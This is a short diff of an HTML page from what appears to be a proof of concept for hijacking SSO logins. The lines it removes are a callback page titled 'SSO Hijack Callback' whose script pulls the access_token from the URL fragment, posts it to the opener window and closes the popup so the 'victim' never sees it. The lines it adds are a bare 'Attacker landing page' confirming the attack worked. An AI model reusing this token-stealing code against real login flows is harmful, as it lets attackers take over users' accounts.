@@ -1,29 +1,5 @@
 <!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>SSO Hijack Callback</title>
-</head>
-<body>
-  <p>Processing…</p>
-  <script>
-    // 1) Grab the access_token from the URL fragment
-    const params = new URLSearchParams(location.hash.slice(1));
-    const token  = params.get('access_token');
-
-    if (!token) {
-      document.body.textContent = '⚠️ No token found.';
-    } else {
-      // 2) Post it back to the opener (parent) window
-      window.opener.postMessage(
-        { type: 'got_token', token },
-        window.origin
-      );
-      // 3) Close the popup immediately so the victim never sees this page
-      window.close();
-    }
-  </script>
-</body>
-</html>
-
-
+<meta charset="utf-8">
+<title>Attacker landing</title>
+<h1>Attacker landing page</h1>
+<p>If this page appears in the popup, the attack succeeded.</p>
